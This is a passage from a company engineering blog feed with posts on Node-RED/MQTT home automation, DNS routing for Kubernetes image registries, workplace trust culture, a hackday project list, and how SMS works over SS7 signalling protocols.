You could then setup bridging to not worry about credentials and TLS when consuming your events.</p><h2>Wrapping it all up</h2><p>For this project I chose to use Node-RED, as it allows for very quick and easy to show drag-and-drop integrations.</p><p>To control the lamp, we did add the module <code>node-red-contrib-tradfri</code> as described in the Node-RED <a href="https://flows.nodered.org/node/node-red-contrib-tradfri">documentation</a>.</p><p>First we did add a <code>mqtt out</code> node configured to listen to the topic 46123456789/# with output as a parsed JSON object using the credentials we got on login.</p><p><img src="/img/blog/mqtt-event-bridge/nodered-debug.png"/></p><p>We then simply hooked its output to a debug node. Looking at the output, we can see that the event object has a key <code>voiceEvent</code>, as this is a voice event.</p><p><img src="/img/blog/mqtt-event-bridge/nodered-flow.png"/></p><p>Then we added a switch for handling it as a voice event if the voiceEvent key exists. Likewise, we added a new switch on the type field of that event.</p><p>Each of those functions simply set the Trådfri payload, as shown below:</p><pre><code class="language-json">{&quot;state&quot;:&quot;on&quot;,&quot;color&quot;:&quot;cool daylight&quot;}
</code></pre><p>As this was created quickly as a hackathon project, the intention was never to actually make anything useful. Using this quick flow, it is however clear that it could be very useful for when my wife tries to call me, but I am programming equipped with my noise-cancelling headphones.</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Forbidden lore: hacking DNS routing for k8s]]></title>
            <link>https://www.wgtwo.com/blog/forbidden-lore-hacking-dns-routing-for-k8s</link>
            <guid>forbidden-lore-hacking-dns-routing-for-k8s</guid>
            <pubDate>Fri, 11 Dec 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[At WG2 we’re coming close to having everything running in Kubernetes, which means that almost everything we deploy needs to be pulled from a registry. We have run our own local registry for some time now, to host both locally-built images and cached images from Docker Hub.]]></description>
            <content:encoded><![CDATA[<p>At WG2 we’re coming close to having everything running in Kubernetes, which means that almost everything we deploy needs to be pulled from a registry. We have run our own local registry for some time now, to host both locally-built images and cached images from Docker Hub.</p><p>We recently decided to improve the registry solution by implementing <a href="https://goharbor.io/">Harbor</a> to scan images for vulnerabilities on upload, and replicating the registry into each of our multiple environments and regions. This would both eliminate Harbor as a single point of failure, and allow each cluster to pull images locally to minimise data transfer costs through the NAT gateway.</p><p>The overall workflow would look something like:</p><ul><li>images are built and uploaded to Harbor</li><li>Harbor scans for vulnerabilities and pushes images to a private registry</li><li>this registry is replicated to a read-only registry</li><li>the read-only registry is replicated to all environments and regions</li><li>the Kubernetes cluster in each environment deploys from the local read-only registry</li></ul><p><img src="/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/multiregion.jpg" alt="Workflow"/></p><p>Harbor has to live somewhere, so we decided it should live in the dev environment, close to the CI system that builds the majority of our images. However, container image names contain the registry location that they are pulled from / pushed to, eg <code>reg.wgtwo.com/infra/logstash</code>. Therefore in the dev environment we have to find a way to deal with the fact that we want users and the CI system to push to Harbor, but we also want Kubernetes to pull images from the read-only registry.</p><p>So the main problem becomes: if the image name includes the url <code>reg.wgtwo.com</code>, how to make that point to two different places depending on usage?</p><h1>Solution 1: DNS</h1><p>In non-dev environments, the obvious solution is to redirect <code>reg.wgtwo.com -&gt; read-only-registry</code> in Kubernetes CoreDNS. But in dev, we need different services to go to different places. The DNS model thus needs to look like:</p><p><img src="/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/dnsresolution.jpg" alt="DNS"/></p><p>In other words,</p><ul><li><code>Route53</code> sets <code>reg.wgtwo.com -&gt; harbor</code></li><li>K8s coreDNS sets <code>reg.wgtwo.com -&gt; read-only-registry</code></li><li>CI (Concourse) bypasses cluster lookup and goes to <code>Route53</code> instead, such that <code>reg.wgtwo.com -&gt; harbor</code></li></ul><p>We initially deployed a DNS sidecar to the CI system, but with multiple Concourse pods we got multiple sidecars and we really only needed one, plus we had to manipulate Concourse’s internal DNS cache (<code>CONCOURSE_GARDEN_DNS_SERVER</code>) but that broke DNS between Concourse and everything else in the cluster. Replacing the sidecar with a DNS pod in the CI namespace worked better, although then all the CI jobs needed to be updated to use that new pod as their nameserver.</p><p><img src="/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/sleight-of-hand.gif" alt="Sleight of hand"/></p><p>However at this point we realised that although we want to deploy pods into Kubernetes, the process that does the deploying lives on the Kubernetes nodes, outside of cluster scope.
We don’t do any config management on the nodes, we just let <a href="https://github.com/kubernetes/kops">kOps</a> deploy everything that Kubernetes needs for a cluster, so we were reluctant to introduce an entirely different system just for managing one <code>resolv.conf</code> file. Also the concentric DNS setup would have a very wide scope and be somewhat difficult to debug. Maybe this was a problem better resolved using some clever nginx routing?</p><h1>Solution 2: nginx</h1><p>If we could find some way of differentiating the Harbor traffic from read-only-registry traffic, we could let nginx route requests to the right place.</p><iframe src="https://giphy.com/embed/QaPkV29BJh3gI" width="240" height="177" frameBorder="0" class="giphy-embed" allowfullscreen=""></iframe><h1>Solution 2a: nginx routes traffic on IP</h1><ul><li>Traffic from the outside world plus traffic from Concourse needs to go to Harbor.</li><li>Traffic from the Kubernetes cluster needs to go to the read-only-registry.</li></ul><p>The <a href="http://nginx.org/en/docs/http/ngx_http_geo_module.html">nginx geo module</a> sounded like a good idea, where we could set our internal subnet ranges to go to the read-only-registry. However getting the ingress annotations to put this config in the right place turned out to be challenging, since it needs to go outside of both <code>http snippet</code> and <code>server snippet</code> blocks. But before we dug further into this issue we realised that all of the traffic to nginx would arrive via the internet gateway, meaning we wouldn’t see source IP anyway.</p><h1>Solution 2b: nginx routes on custom header</h1><p>The new <code>canary</code> feature in nginx makes this kind of routing very easy - traffic that matches a certain criteria gets sent to a different backend. We could use a custom header such as <code>ro-reg</code> to send internal traffic to the read-only registry.</p><pre><code>annotations:
  nginx.ingress.kubernetes.io/canary: &quot;true&quot;
  nginx.ingress.kubernetes.io/canary-by-header: &quot;ro-reg&quot;
</code></pre><p>The docker (client) config has an <a href="https://github.com/docker/cli/blob/master/man/docker-config-json.5.md">HttpHeaders</a> section, so it would be easy enough to add this section to all of our image-pull secrets, meaning all internal pulls - but nothing else - should go to the read-only registry.</p><p>We had to rearrange things a little in order to terminate SSL on nginx and not at the registry so that nginx would be able to read the headers, but that was straightforward.</p><p>In our initial tests from the laptop, this worked great. However it quickly transpired that this was the only place it worked from. Where we needed it to work from - the Kubernetes nodes - didn’t run Docker, they run <code>docker-shim</code> on top of <code>containerd</code>, and <code>HttpHeaders</code> <a href="https://github.com/containerd/cri/issues/1400">are not implemented yet</a>. Back to the drawing board.</p><h1>Solution 2c: nginx routes on auth header</h1><p>Getting nervous that we’d used a week to get nothing working, we started clutching at some very hacky straws. Even if docker-shim doesn’t send custom headers, we could see it sending auth headers, and we have different login details for Harbor versus the read-only registry. We wondered if we could route on the auth hash, postponing entirely the discussion about whether we should do such a horrible thing, or the security implications of having the auth hash in a plaintext nginx config.</p><iframe src="https://giphy.com/embed/I8RMi1UY8cEKs" frameBorder="20px" class="giphy-embed" allowfullscreen=""></iframe><p>We soon discovered that this solution was also never going to work. In Kubernetes, it is the <code>kubelet</code> process that does the image pull at the start of a pod deployment, and after some wiresharking it turns out that the very first thing kubelet does is make an unauthenticated call to the <code>registry/v2</code> endpoint to fetch metadata which it then uses to begin authentication.</p><p>This is expected behaviour for a docker registry, <a href="https://docs.docker.com/registry/spec/auth/token/">according to documentation</a>, but with nginx routing on auth header, it meant that the initial call was routed to Harbor which sent back an auth URL also for Harbor, and thus kubelet never even arrived at the read-only registry, let alone managed to authenticate.</p><h1>Aside: other issues with headers</h1><p>During this debugging session we also realised that we’d been creating image-pull secrets in Kubernetes with both <code>.dockercfg</code> and <code>.dockerconfigjson</code>, not realising that <code>.dockercfg</code> <a href="https://github.com/moby/moby/pull/12009">is the old format</a> and that <code>.dockercfg</code> likely does not support HttpHeaders at all.</p><p>Kubelet <a href="https://github.com/Kubernetes/Kubernetes/blob/e1fd2d7ff57af153023347d72d17226effd917c8/pkg/credentialprovider/config.go#L44">does support HttpHeaders</a>, but relies on the underlying container runtime to also support them - which is not the case for containerd.</p><p>Additionally, when creating a Kubernetes secret containing <code>.dockerconfigjson</code>, it appears that it is very important that there is no whitespace in the secret, or authentication will fail.</p><h1>Solution 2d: route on some other inherent header</h1><p>As one final attempt at making nginx routing work, we looked for other headers being sent, but there was no single header that let us differentiate between kubelet, laptop, and Concourse.</p><p>Kubelet sends a useragent of either <code>docker</code> or <code>go-http-agent</code> (depending on whether the call is the initial one or a retrial) and filtering on <code>go-http-agent</code> also catches Concourse requests, rendering it useless for this task. We were also worried it might end up catching all sorts of unintended cases since we have quite a lot of <code>go</code>-based applications in our ecosystem.</p><p>We took a moment to mourn the loss of our nginx idea, and went back to a DNS solution.</p><p><img src="/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/pulpfiction.jpg" alt="Mourn"/></p><h1>Solution 3: DNS, again</h1><p>We put the DNS solution back in place again, where</p><ul><li><code>Route53</code> sets <code>reg.wgtwo.com -&gt; harbor</code></li><li>K8s nodes set <code>reg.wgtwo.com -&gt; read-only-registry</code></li><li>K8s coreDNS sets <code>reg.wgtwo.com -&gt; read-only-registry</code></li><li>CI runs an additional coreDNS pod setting <code>reg.wgtwo.com -&gt; harbor</code></li><li>Concourse uses CI coreDNS pod to set <code>reg.wgtwo.com -&gt; harbor</code></li></ul><p>Which brought us back to the problem that was still there: how to update <code>/etc/resolv.conf</code> on the nodes. In the continued absence of config management, we hit upon the wonderful hack of using a privileged pod daemonset to manage the config for us via systemd.</p><p>The privileged pod on each node would write a new config file to <code>/etc/systemd/resolvd.conf</code>, and then restart the systemd service to update the running resolvd process.</p><p>This would thus control configuration on the Kubernetes node from inside of Kubernetes, which is admittedly morally wrong but also works really well. It also keeps the configuration alongside all the rest of our configuration instead of hidden away somewhere new.</p><p><img src="/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/wheelchange.gif" alt="wheel change"/></p><p>A future solution might be to implement some kind of local DNS server/cache on each node, but for now we’ll settle for a working system and a huge increase in knowledge about the inner workings of many of our components.</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[We're all grownups here]]></title>
            <link>https://www.wgtwo.com/blog/were-all-grownups-here</link>
            <guid>were-all-grownups-here</guid>
            <pubDate>Fri, 20 Nov 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[I have always struggled with company HR policies that make me not feel trusted. Why don’t HR and/or management trust who they hire? Why create HR processes for the very few people who don’t behave? Shouldn’t processes be designed for the vast majority of people who are to be trusted? I just don’t get it. If you are given freedom it comes with a lot of responsibility, isn’t that rather implicit?]]></description>
            <content:encoded><![CDATA[<p>I have always struggled with company HR policies that make me not feel trusted. Why don’t HR and/or management trust who they hire? Why create HR processes for the very few people who don’t behave? Shouldn’t processes be designed for the vast majority of people who are to be trusted? I just don’t get it. If you are given freedom it comes with a lot of responsibility, isn’t that rather implicit?</p><p>It comes down to a choice - minimize risk by implementing all possible controls, or trust people and implement necessary controls only. We believe the latter drives ownership, motivation and a better product and company. That doesn’t mean it is easy though - the need to control is a fundamental human need, and we need daily reminders to always push in the opposite direction.</p><p>When I was in discussions with Erlend (our CEO) about joining <strong>wgtwo</strong>, the term “startup for grownups” was used and I remember thinking “huh, that makes sense”. Now, 2 years in, the simple fact that yes we are all grownups here and we all deserve to be treated as such has become an embedded part of our company culture.</p><p>I wanted to give you some tangible examples of how we do things. For context, we are a startup tech company with a team of ~50 (87% engineers). We have offices in Oslo, Trondheim, Stockholm, a hub in Germany and remote team members in Japan, Spain, the U.S., Canada, London and Myanmar.</p><h2>What approvals?</h2><p>We try to minimize that amount of approvals necessary to a minimum. Here is how we communicate that to new hires in some of the areas companies typically have approvals</p><ul><li>Vacation: Yes, we do have the standard 25 days of vacation (standard in the Nordics) in our contracts. But, we also trust you to know yourself best, and understand that no year or situation is the same. Sometimes you might need more, sometimes less. As long as it works for your team, we trust you to make a judgement. We also trust that you take enough time off as we all need time off to reset and recharge.</li><li>Expenses: We trust your judgement and that you wouldn’t be making the purchase if it wasn’t necessary for you and the team. This applies when deciding on which equipment (i.e. laptop, monitor, keyboard, phone etc) you need when you start and later if there is something you need. I have yet to experience anyone asking for anything totally unreasonable. Of course you are welcome to reach out if you are unsure and from time to time we might have discussions, but surprisingly seldom to be honest.</li><li>Travel: We encourage you to travel between offices to build a strong relationship with the whole team (unfortunately not now of course with the covid-19 going on). You do not need approval to book travel, and remember you don’t need a “reason” to go.</li><li>Working hours: As long as you do a good job we don’t care if you work half days Mondays or start working at lunch time and into the evening, go to the gym and so on. Up to you, as long as it works for your team. Not to mention where you work from. Office, home, cabin, boat - who cares as long as you are connected right?</li></ul><p>These aren’t necessarily big things in everyday life, but they take out administrative hassle, and it aligns with the messaging of that we try to trust each other.</p><h2>Are you a role model?</h2><p>This lack of approvals does create another need though - the need for role models. So we do remind the team to keep in mind that we are role models for each other. It provides alignment. Whether it’s sharing with the others that the train ticket prices are currently low and recommend people to book now to save money, or taking initiative to set up a virtual social Friday get-together to end the week together. We even have our own role model emoji in slack, which we sometimes remember to use and I do believe people feel proud if they get one.
<img src="/img/blog/were-all-grownups-here/04.png" alt="Decorative illustration"/></p><h2>Sharing is caring</h2><p>That we see each other as grownups is also evident in how we communicate and what information we trust each other with. If there is one thing the team mentions to me that has surprised them the most after joining, it is the amount of information that is shared across the team about sales, customer meetings and other business processes. The good and the bad. When I had a “6 months in” check-in with one of our newest team members he emphasized exactly this and explained how this made him feel involved and prepared for what was coming. It is also evident when people choose to share that they are struggling with the likes of depression or something else often considered very private. Or just putting up your hand and saying “I broke something” and taking responsibility for that. I believe this level of sharing is possible because we trust each other and have each other&#x27;s backs and management leads the way when it comes to sharing.</p><h2>Direction</h2><p>To clarify. We do of course need to make sure we move the company in the right direction together. We have chosen to use OKRs (Objectives and Key Results) as a tool for that. A tool that helps us discuss and decide together as a team what we want to achieve, but without dictating the how. This is a delicate balance, and we always have to fight to not create too detailed OKRs. The teams and individuals should feel empowered when understanding and agreeing on the why and what, but are allowed to determine the how.
<img src="/img/blog/were-all-grownups-here/03.png" alt="Decorative illustration"/></p><h2>Stay open to change</h2><p>So do we have improvement areas? Of course! One example is that I believe we can be better at living one of our values which is “Tough Love”. This relates to among other things how we give feedback. I wouldn’t say we are bad at it, but our inclination is often towards being a bit too soft, which sometimes leads to unclear feedback or neglecting giving feedback. So we need to keep practicing to make sure we challenge and develop each other as much as we can. And I’m sure it’s a bunch of other stuff. We are still a young company and open to change - we try out stuff and sometimes fail. We keep on learning and making small tweaks all the time to adjust to our team. Just this morning I listened to an inspiring 5 min talk from Lucy Adams about probation periods and realized that we have those in our contracts -  yikes that doesn’t exactly scream that we trust who we recruit does it? I will look into that asap…</p><p>So, we are all grownups here. At least most of the time. Although maybe not when the Trondheim team bought naughty chocolates and expensed it to see if anyone would notice (we didn’t).</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[October Virtual Hackdays]]></title>
            <link>https://www.wgtwo.com/blog/hackdays-october-2020</link>
            <guid>hackdays-october-2020</guid>
            <pubDate>Wed, 28 Oct 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[This week we started off with a three days hackathon!]]></description>
            <content:encoded><![CDATA[<p>This week we started off with a three days hackathon! </p><p>Every quarter <strong>wgtwo</strong> holds a three day hackday. Hackdays are a great way for everyone in the company to work together in creating new innovative solutions for every day problems. </p><p>This time, we had the joy of having a three day remote hackday that included 10+ teams and yes - <em>pizza</em>. </p><img class="image" src="/img/blog/hackdays-october-2020/presentations.png" alt="Most of us"/><h1>Hackday Presentations</h1><h2>Grafana Annotations</h2><p><em>Team: Jonny, Per, Victoria</em></p><p>Add git commit and other tags (i.e. pagerduty alerts) as annotations in Grafana.</p><h2>Tokens to the people</h2><p><em>Team: Håkon</em></p><p>Easy access to create new developer tokens to our APIs.</p><h2>It&#x27;s broken (or malware)</h2><p><em>Team: Holger, Noy</em></p><p>Setup pies to be able to automate testing.</p><h2>Java 11 Toolchain</h2><p><em>Team: Stein Eldar</em></p><p>Upgrade of Java toolchain in Bazel!</p><h2>Random bazel facts</h2><p><em>Team: Konstantin</em></p><p>Good to have configurations for Bazel caching.</p><h2>GTP-C tracing on PGW</h2><p><em>Team: Pavel</em></p><p>Investigate and experiment how to upload PCAP traces from PGW in S3.</p><h2>mtr-packet-exporter</h2><p><em>Team: Bjørn</em></p><p>Export routing hops and latency metrics to prometheus.</p><h2>Kafka voice - kava</h2><p><em>Team: Sergey</em></p><p>Kafka instead of Firebreeze as a backend for Voice.</p><h2>Parental Control on PGW</h2><p><em>Team: Etienne / Nicholas</em></p><p>Dynamic subscriber-based APN configurations for parental control DNS.</p><h2>text rules</h2><p><em>Team: Jørund</em></p><p>Migrating SMS forwarding into a separate app under <strong>wgtwo</strong> developer platform.</p><h2>Distributed tracing</h2><p><em>Team: Karl Johan/William</em></p><p>Jaeger tracing to be able to follow time spent in different components.</p><h2>3 ideas to attract/hire engineers</h2><p><em>Team: Ana/Jessica</em></p><p>Advent of code, showing engineering day-to-day work, image/video snippets.</p><h2>MQTT for events</h2><p><em>Team: GI</em></p><p>Home automation with MQTT server as an app.</p><h2>David sucks at load testing (loomylin)</h2><p><em>Team: David</em></p><p>Utilize project Loom to get lightweight virtual threads in JVM.</p><h2>AWS Transit Gateway</h2><p><em>Team: Erhan</em></p><p>Maintaining routes and connecting subnets between VPCs with a transit gateway.</p><h2>PCAP traces as JSON</h2><p><em>Team: Masse</em></p><p>Translate pcaps to a readable format and upload it to Athena.</p><img class="image" src="/img/blog/hackdays-october-2020/hackday.jpeg" alt="hackday logo stickers"/>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[What the heck is a short message?]]></title>
            <link>https://www.wgtwo.com/blog/what-is-a-short-message</link>
            <guid>what-is-a-short-message</guid>
            <pubDate>Thu, 01 Oct 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[I will try as best as I can to give an explanation of what happens]]></description>
            <content:encoded><![CDATA[<p>I will try as best as I can to give an explanation of what happens
when you send an SMS from your phone.</p><p>Disclaimer: Telco stuff is hard.</p><p>Also disclaimer: this blog post will also contain alot of ackronyms,
after all, it is telco.</p><p><em>Aaand down the rabbit hole we go...</em></p><h1>Where to even start</h1><p>In the <em>SS7</em> (telco/telecom/telecommunications) network there are many
different nodes (servers), with different kinds of tasks.</p><p>The group of protocols that is used to send signals over <em>IP</em> between
these nodes is called <em>SIGTRAN</em> (derived from &quot;signaling transport&quot;).
Older networks that have not switched to <em>IP</em> do not use <em>SIGTRAN</em>.</p><p><em>SIGTRAN</em> protocols are the lower layer protocols used for signaling,
they range from <em>SCTP</em> (Stream Control Transmission Protocol) to
<em>M2PA</em> (Message Transfer Part 2 User Peer-to-Peer Adaptation Layer)
and <em>M3UA</em> (Message Transfer Part 3 User Adaptation Layer).</p><p><em>SCTP</em> is like a mix between <em>UDP</em> and <em>TCP</em>. It is supposed to be
quicker than <em>TCP</em>, but more reliable than <em>UDP</em>.</p><p>Both <em>M2PA</em> and <em>M3UA</em> support <em>SCTP</em> management, and the reporting of
status changes of those, as well as providing transfer of <em>MTP3</em>
(Message Transfer Part 3) messages.</p><p>On top of <em>SIGTRAN</em> are the <em>SS7</em> protocols.</p><p>What I&#x27;m going to talk about are the protocols on the very top of <em>SS7</em>,
specifically the <em>MAP</em> (Mobile Application Part) as well as the <em>TCAP</em>
(Transaction Capabilities Application Part). There are other protocols
inbetween, for instance <em>SCCP</em> (Signalling Connection Control Part)
which handles some handshaking, routing, and resilience.</p><p>The <em>MAP</em> layer is used when talking to some of the telco nodes such
as <em>HLR</em> (Home location registry), <em>VLR</em> (Visitor location registry),
<em>MSC</em> (Mobile switching centre), <em>SGSN</em> (Serving <em>GPRS</em> <!-- -->[ackronym in
ackronyms; go telco!]<!-- --> support node) and the <em>SMSC</em> (Short message
service centre).</p><h1>MAP versions and TCAP dialogues</h1><p>There are some iterations of <em>MAP</em> (v1, v2, v3, and v4) and messages
almost always come in pairs, an acknowledgement (<code>ReturnResult</code> or
<code>ReturnError</code>) for each sent message (<code>Invoke</code>).</p><p>To determine which version to use between two nodes, the sending node
tries to start the transaction (called a dialogue) by sending a <em>TCAP</em>
<code>Begin</code> message with the <em>MAP</em> message and it&#x27;s highest compatible
version. If the receiving node cannot talk that version, it sends a
<em>TCAP</em> <code>Abort</code> message with it&#x27;s highest compatible version. In v1
there might not even be a reason, just an empty <code>Abort</code>; the sending
node might then try to send the <em>MAP</em> message as v1 anyway.</p><p>In my head it goes like this:</p><pre><code>Node 1: &quot;Hi, I want to talk version 3 to you about this&quot;
Node 2: &quot;No I don&#x27;t understand you, but we can talk version 2 about it instead&quot;
Node 1: &quot;Ok, then I want to talk version 2 to you about this instead&quot;
Node 2: &quot;Aah, now I see...&quot;
</code></pre><p>Or maybe</p><pre><code>Node 1: &quot;Hi, I want to talk version 3 to you about this&quot;
Node 2: &quot;No&quot;
Node 1: &quot;Ok, then I want to talk to you about this in version 1 instead&quot;
Node 2: &quot;Maybe I will talk to you, maybe I will not&quot;
</code></pre><p>For <em>TCAP</em> dialogues there are (mainly) four message types.  <code>Begin</code>,
<code>Continue</code>, <code>End</code>, <code>Abort</code>. Each of the types have an ID (or two, as I
said, telco is complicated), a component and a dialogue part. The
component contains the <em>MAP</em> message. The dialogue part contains
the version and application to use (that is <em>MAP</em> Application;
i.e. which type of message it contains), but it is only used in the
first message from both nodes for the version negotiation.</p><p><em>I think this covers most of it, let&#x27;s get back to the fun part.</em></p><h1>How does SMS work?</h1><p><em>SMS</em> was initally implemented because of the wish to send text
messages to pagers using the phoneline when it was not in use for
phonecalls. It was decided at a meeting in Oslo to be released to the
public when some French and German company understood it&#x27;s
value. (Don&#x27;t quote me on any of this).</p><p>When you send an <em>SMS</em>, the <em>SMS</em> is transfered to the <em>MSC</em> or the
<em>SGSN</em> in your current (serving) network. The <em>MSC</em> or <em>SGSN</em> then
sends an packet called <code>MO-Forward-SM</code> towards the <em>SMSC</em> in your
current network. It stands for &quot;Mobile Originating Forward Short
Message&quot; meaning it started from your (mobile-)phone.</p><p>The <em>SMSC</em> then asks the recipients HLR about the routing details for
the <em>SMS</em>. It does so by sending another <em>MAP</em> message of type
<code>sendRoutingInfoForSM</code> requesting the location of the recipients <em>MSC</em>
or <em>SGSN</em>, or both.</p><p>The <em>SMSC</em> then sends another packet, this time a <code>MT-Forward-SM</code>,
towards the <em>MSC</em> in the recipients network. In this case <em>MT</em> stands
for Mobile Terminated, meaning it goes towards the recipients phone.</p><p><em>Dia have amazing icons:</em></p><div><img src="/img/blog/sms/forward-sm.svg" alt="You calling your mom"/></div><p>The similarities in <em>MO</em> and <em>MT</em> requests are that they both contain
a origin and destination address as well as the user data (your actual
text message), and a possibly a correlation id which is basically a
mapping between your SIM-card id and a temporary id and was originally
used for making sure that the sending network paid for <em>SMS</em>s towards
the receiving network.</p><p>For <em>MO</em> the origin address is your <em>MSISDN</em> (read telephone number),
and the destination is the <em>GT</em> address (Global title; a way to route
stuff) of the <em>SMSC</em>. For <em>MT</em> messages the origin address is the <em>GT</em>
of the <em>SMSC</em> and the destination address is either the recipients
<em>IMSI</em> (read SIM-card) or the recipients correlation id. It could also
be a <em>LMSI</em> which is a 4-byte network location identifier if the
recipient is also within the same network as the sender.</p><h2>Ever wondered why there is a limit to the size of the text message you are sending?</h2><div class="left-right-row"><div class="text">Two characters left on a GSM7 encoded SMS.</div><img class="image" src="/img/blog/sms/160_chars.png" alt="Characters left: 2/160"/></div><p>If you (god forbid) you would break the protocol and send a text
message greater than 140 bytes, which translates to 160, 152, or 70
characters depending on locale <!-- -->[1]<!-- -->, then your phone would break up the
message into multiple text messages. This arbitrary size of 140 bytes
is not really arbitrary at all. It was chosen because it would
precisely fit into a single <em>MTP3</em> <em>SIF</em> (Signalling Information
Field) when routing label, <em>SCCP</em>, <em>TCAP</em> and <em>MAP</em> layers were taken
into account.</p><p>[1]<!-- --> There is something called <em>GSM7</em> bit-packing. Instead of using 1
byte (8 bits) per character, <em>GSM7</em> uses 7 bits. This means that
instead of 140 characters, you can get up to 160 characters per
<em>SMS</em>. The drawback is that you will have a smaller subset of
characters to use, only the most common is supported. If you include
any non-<em>GSM7</em> characters in your <em>SMS</em> then the <em>SMS</em> will
automatically be converted to use either <em>USC-2</em> or <em>GSM7</em> with a
different charset instead. <em>USC-2</em> uses 2 bytes, or 16 bits, instead
of <em>GSM7</em>s 7 bits. That leaves you with 70 characters per
<em>SMS</em>. <em>USC-2</em> is similar for the basic multilingual plane (<em>BMP</em>) to
<em>UTF-16</em>. In fact <em>UTF-16</em> is an extension of <em>UCS-2</em>. The main
difference is that <em>USC-2</em> is fixed width and does not allow for the
extended characters in the private use area of <em>BMP</em>. <em>UTF-16</em> is
variable width of one or two 16-bits code points, and does allow the
extended characters. For extended characters to work (for instance
&quot;praying/folded hands&quot; <!-- -->🙏<!-- -->), phones might try to fake <em>UTF-16</em>
by using two <em>USC-2</em> characters. New phones can handle this fine, but
older phones might receive two question marks as they cannot decode it
properly.</p><p>If <em>GSM7</em> have a modified charset (i.e. not the default <em>BMP</em>) then
there will be a header in front that specifies that. That header will
take up 7 bytes after packing (in other words 8 characters), making
the maximum length of the <em>SMS</em> 152 characters.</p><div class="left-right-row"><img class="image" src="/img/blog/sms/67_chars.png" alt="Characters left: 45/67 (3)"/><div class="text">Using emojis will convert the encoding to USC-2. Note the missing 3 characters and that there are multiple SMSes. When multiple messages are sent, the phone needs some way of telling how to reassemble the messages. The headers take up 6 bytes per message for this purpose.</div></div><p>However when <em>MAP</em> v2 started to use <em>TCAP</em> dialogues there was more
information to put into the packet and 140 bytes might not be left for
the <em>SMS</em>. The <em>SMSC</em> would then need to break up the message into
chunks, and start the transaction an empty <em>TCAP</em> <code>Begin</code> message and
set a flag in the <em>MT</em> request called <code>moreMessagesToSend</code>. It would
then send the actual text inside <code>Continue</code> messages. In the end
the <code>End</code> (<em>hehe</em>) message is transmitted as a response and the
transaction is finished.</p><p>The response back to a <em>MO</em> request is, as previous stated, an
acknowledgement if the <em>SMS</em> have been successfully submitted to the
<em>SMSC</em> or not (again either <code>returnResult</code> or <code>returnError</code>). For <em>MT</em>
requests the acknowledgement is if the <em>SMS</em> is successfully delivered
or not.</p><p>If the <em>MT</em> request is not successful, the <em>SMSC</em> could ask the <em>HLR</em>
(the Home Location Registry is basically a database containing user
subscriptions and knowledge of which nodes the mobile talked to
latest) to be notified when the user comes back online. A bunch of
other <em>MAP</em> messages are then involved, such as</p><ul><li><code>reportSMDeliveryStatus</code>,</li><li><code>informServiceCentre</code>,</li><li><code>alterServiceCentre</code>, and</li><li><code>readyForSM</code>.</li></ul><p><em>At least this is main idea I think...</em></p><h1>Differences in MAP versions for SMS</h1><p>There are three <em>MAP</em> versions defined for <em>SMS</em>. The latest version
(v4) is not used in the context of <em>SMS</em>.</p><p>In version 1, the dialogue portion was not invented and all chunks are
sent in new <em>TCAP</em> dialogues. The size of the user data could then
be 140 bytes.</p><p>In version 1 and version 2 there is no difference between <em>MT</em> and
<em>MO</em>. Everything is sent as another type of message <code>Forward-SM</code>,
which does not include any privacy correlation ids, and there are no
fancy responses with delivery status. There is still an
acknowledgement, but is in a form of an empty message.</p><p>Only way to see difference between an <em>MO</em> and a <em>MT</em> in version 1 is
to look at the addresses and see if they are either coming from an
<em>SMSC</em> or going to an <em>SMSC</em>.</p><p>The <code>moreMessagesToSend</code> flag was implemented in version 2, so it exist
only for version 2 and version 3.</p><p>Ok, to recap, what do we have now</p><ul><li><code>Begin</code>, <code>Continue</code>, <code>End</code>, <code>Abort</code> messages.</li><li>Dialogue handshake in the first request/response messages sent.</li><li><code>MT-Forward-SM</code>, <code>MO-Forward-SM</code>, <code>Forward-SM</code></li><li>Involved parties: Mobile phones, <em>MSC</em> and <em>SMSC</em></li></ul><p><em>Wait we are missing something. I&#x27;ve only covered 2G,3G..</em></p><h1>What about 4G/LTE and beyond (5G)?</h1><p><em>Ouch.</em></p><p><em>LTE</em> networks does not use any of the <em>M3UA</em>, <em>SCCP</em>, <em>TCAP</em>, <em>MAP</em>
protocols. In <em>LTE</em> networks the main message type is <em>Diameter</em> which
doesn&#x27;t contain fragmentation and can contain larger
messages. Everything is sent in one request and every request is
answered with a response. <em>Diameter</em> could use either <em>TCP</em> or <em>SCTP</em> as
transport layer.</p><p>To make <em>SMSes</em> work on <em>LTE</em> networks a new interface <em>SGs</em> was
invented which translates <em>SS7</em> messages to <em>Diameter</em> messages.  This
interface is in most cases used by the <em>MSC</em> to translate the messages
to <em>Diameter</em> and forward it to the <em>MME</em> (Mobility Management Entity,
similar to <em>SGSN</em> but in the <em>LTE</em> network). The <em>MME</em> then forwards
it to the <em>UE</em> (user equipment, same as mobile subscriber or <em>MS</em> in
<em>GSM</em>/<em>GPRS</em> networks).</p><p>There is also the <em>SM-over-IP</em> that does not use <em>Diameter</em>. Instead
it uses the <em>SIP</em>-protocol (Session Initiation Protocol) to transfer
messages over <em>IP</em> and <em>TCP</em> or <em>UDP</em> to the <em>IMS</em> (IP Multimedia
Subsystem). <em>SIP</em> is also used to enable VoLTE (Voice over <em>LTE</em>).</p><p>For 5G the <em>SMSC</em> is called <em>SMSF</em>; The Centre becomes a Function. The
signalling will be based on <em>HTTP2</em>/<em>JSON</em> ontop of <em>TCP</em>. The <em>SMSF</em>
